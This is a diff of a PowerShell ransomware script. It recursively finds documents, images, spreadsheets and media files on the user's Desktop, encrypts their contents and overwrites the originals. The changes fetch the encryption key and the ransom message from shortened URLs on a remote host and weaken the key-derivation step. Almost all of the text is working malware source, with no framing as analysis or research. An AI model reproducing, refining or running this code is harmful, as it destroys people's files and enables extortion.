@@ -1,6 +1,6 @@
 $web = New-Object Net.WebClient
-$key = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCvXIGeuwHQzt0XVyRBA9/bCK7j9b4celVVd5ATSr/6Ev6QiBagf+d11l71Eqhznddzgi5+hEB+j5VPJq+4EjdD7JLnVjd/kxd4xkCFjkWsjEY9Vh41kZDoB3F0z92zkwHIx/wVtJJdq6vUX1Q9TMSRjQrA+XpdotSU+2Q/lBP12QIDAQAB"
-$text = "You've got Malware!"
+$key = $web.DownloadString("https://goo.gl/drDgnJ")
+$text = $web.DownloadString("https://goo.gl/7oKo86")
 
 function Encrypt-File($String, $Passphrase)
 {
@@ -10,7 +10,7 @@ function Encrypt-File($String, $Passphrase)
     $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase)
     $salt = [Text.Encoding]::UTF8.GetBytes($salt)
 
-    $r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 15).GetBytes(32) #512/20
+    $r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32) #256/8
     $r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15]
    
     $c = $r.CreateEncryptor()
@@ -29,7 +29,7 @@ $DesktopPath = [Environment]::GetFolderPath("Desktop")
 
 gci $DesktopPath -Recurse -Include "*.png","*.txt","*.xlsx","*.docx","*.pdf","*.doc","*.mp3","*.wav","*.rar","*.jpeg","*.jpg","*.bmp","*.xls","*.mp4","*.wmv","*.avi","*.mpg",","*.ppt","*.pptx","*.csv" | %{
 
-  try{
+   try{
        $file = Get-Content $_ -raw;
        $encrypt = Encrypt-File $file $key
        Set-Content -Path $_ -Value $encrypt
